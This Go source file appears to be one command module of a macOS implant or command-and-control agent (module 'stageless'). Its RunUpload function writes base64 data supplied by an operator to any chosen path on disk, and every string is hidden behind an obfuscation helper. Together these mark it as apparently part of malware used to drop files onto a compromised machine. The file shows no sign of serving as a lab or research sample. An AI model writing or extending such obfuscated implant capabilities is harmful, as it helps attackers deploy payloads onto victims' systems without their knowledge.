package capabilities

import (
	"encoding/base64"
	"fmt"
	"os"

	"stageless/utils/macapi"
	"stageless/utils/obf"
	"stageless/utils/tasks"
)

func RunUpload(input, params string) []byte {
	// Main function that writes uploaded file data to disk
	outPath := tasks.ParamValue(params, obf.S("output"), []string{obf.S("-o"), obf.S("--output")})
	if outPath == "" {
		return WriteMsg(obf.S("Error: missing output path (-o / --output)"))
	}
	if input == "" {
		return WriteMsg(obf.S("Error: empty file data"))
	}
	raw, err := base64.StdEncoding.DecodeString(input)
	if err != nil || len(raw) == 0 {
		return WriteMsg(obf.S("Error: invalid file data"))
	}
	if err := os.WriteFile(outPath, raw, 0o644); err != nil {
		return WriteMsg(obf.S("Error: ") + macapi.IOErrorMessage(err))
	}
	return WriteMsg(
		obf.S("File uploaded successfully (") + outPath + obf.S("), ") +
			fmt.Sprintf("%d", len(raw)) + obf.S(" bytes"),
	)
}
